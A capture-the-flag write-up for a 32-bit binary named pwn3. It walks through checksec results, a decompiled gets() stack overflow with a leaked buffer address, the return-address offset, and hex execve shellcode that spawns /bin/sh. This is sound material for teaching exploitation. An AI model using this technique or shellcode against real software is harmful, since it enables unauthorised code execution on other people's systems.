# pwn3

Start with some basic file enumeration

```s
$ file pwn3 
pwn3: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=6ea573b4a0896b428db719747b139e6458d440a0, not stripped
$ pwn checksec --file pwn3
[*] 'pwn3'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
```

Some interesting notes:
- 32-bit binary
- The app is not stripped
- Full RELRO is enabled
- PIE is enabled

Throw the application in Ghidra and look at the main function.

```c
undefined4 main(undefined1 param_1)
{
  setvbuf(stdout,(char *)0x2,0,0);
  echo();
  return 0;
}
```

Seems like all `main` does is call `echo`. Looking at `echo`:

```c
void echo(void)
{
  char target [294]; 
  printf("Take this, you might need it on your journey %p!\n",target);
  gets(target);
  return;
}
```

There is an overflow from the `gets` call. The app also leaks an address off for us. This'll take care of PIE.

First, determine the offset from the return address:

```s
gef➤  pattern offset $esp
[+] Searching for '$esp'
[+] Found at offset 302 (little-endian search) likely
[+] Found at offset 110 (big-endian search) 
gef➤
```

Since an address is leaked for you simply jump to it to get code execution. I used `shellcraft` to create shellcode:

```s
$ pwn shellcraft i386.linux.sh -f d
\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x68\x01\x01\x01\x01\x81\x34\x24\x72\x69\x01\x01\x31\xc9\x51\x6a\x04\x59\x01\xe1\x51\x89\xe1\x31\xd2\x6a\x0b\x58\xcd\x80
```